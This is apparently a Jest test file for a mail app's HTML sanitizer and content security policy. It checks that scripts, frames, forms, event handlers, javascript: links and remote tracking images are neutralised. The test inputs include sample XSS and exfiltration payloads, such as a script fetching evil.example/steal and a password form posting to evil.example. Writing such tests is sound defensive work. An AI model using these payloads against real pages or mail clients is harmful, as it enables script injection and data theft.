// lib/mailHtml.js — the document a stranger's email is rendered inside.
//
// This is the highest-consequence file in the Mail screens: everything it
// wraps was written by whoever sent the message. The checks below are about
// CAPABILITY, not appearance — what the message can still do once it is on a
// phone screen. The web app's equivalent is apps/web/components/mail/
// SafeHtml.tsx, which uses DOMPurify plus a sandboxed iframe; here the
// equivalents are a WebView with JavaScript off (screens/MailMessage.js) and
// the policy this file writes.

const { strip, blockRemoteImages, textToHtml, buildDocument } = require('../lib/mailHtml');

test('scripts, frames and forms are removed, with their contents', () => {
  const nasty = '<p>hello</p>'
    + '<script>fetch("https://evil.example/steal")</script>'
    + '<iframe src="https://evil.example"></iframe>'
    + '<form action="https://evil.example"><input name="password"></form>'
    + '<object data="x.swf"></object>';
  const out = strip(nasty);
  expect(out).toContain('<p>hello</p>');
  for (const gone of ['<script', 'fetch(', '<iframe', '<form', '<object']) {
    expect(out).not.toContain(gone);
  }
});

test('inline event handlers and javascript: links are defused', () => {
  const out = strip('<a href="javascript:alert(1)" onclick="alert(2)" onmouseover=\'alert(3)\'>tap</a>');
  expect(out).not.toMatch(/onclick|onmouseover/i);
  expect(out).not.toMatch(/javascript:/i);
  expect(out).toContain('>tap</a>');
});

test('remote images are blocked and counted; data: and cid: are left alone', () => {
  const { html, blocked } = blockRemoteImages(
    '<img src="https://tracker.example/open.gif">'
    + '<img src="http://other.example/a.png">'
    + '<img src="data:image/png;base64,AAA">'
    + '<img src="cid:logo">',
  );
  expect(blocked).toBe(2);
  // A \s before src, so data-blocked-src (which CONTAINS "src=...") does not
  // make this pass by accident — it did on the first run.
  expect(html).not.toMatch(/<img[^>]*\ssrc="https?:/);
  expect(html).toContain('data-blocked-src="https://tracker.example/open.gif"');
  expect(html).toContain('src="data:image/png;base64,AAA"');
  expect(html).toContain('src="cid:logo"');
});

test('the policy allows nothing by default, and no remote images until asked', () => {
  const { document, blocked } = buildDocument({
    html: '<img src="https://tracker.example/open.gif"><p>hi</p>', showImages: false,
  });
  expect(document).toContain("default-src 'none'");
  expect(document).toContain('img-src data: cid:;');
  expect(document).not.toContain('https:;');       // images cannot phone home
  expect(document).not.toContain("script-src");    // nothing grants scripts
  expect(blocked).toBe(1);
});

test('Show images widens ONLY images, and nothing else in the policy', () => {
  const off = buildDocument({ html: '<img src="https://x.example/a.png">', showImages: false }).document;
  const on = buildDocument({ html: '<img src="https://x.example/a.png">', showImages: true }).document;
  expect(on).toContain('img-src data: cid: https:');
  expect(on).toContain('src="https://x.example/a.png"');
  // The only difference between the two documents is the image policy and the
  // image itself: default-src, style-src and font-src are untouched.
  for (const rule of ["default-src 'none'", "style-src 'unsafe-inline'", 'font-src data:']) {
    expect(off).toContain(rule);
    expect(on).toContain(rule);
  }
});

test('a plain-text email is escaped, not rendered as markup', () => {
  const html = textToHtml('1 < 2 & <b>not bold</b>\nsecond line https://tatvaos.com');
  expect(html).toContain('1 &lt; 2 &amp; &lt;b&gt;not bold&lt;/b&gt;');
  expect(html).toContain('<br>');
  expect(html).toContain('<a href="https://tatvaos.com">https://tatvaos.com</a>');
});

test('no HTML body: the text body is used instead of an empty screen', () => {
  const { document } = buildDocument({ html: '', text: 'plain words', showImages: false });
  expect(document).toContain('plain words');
});
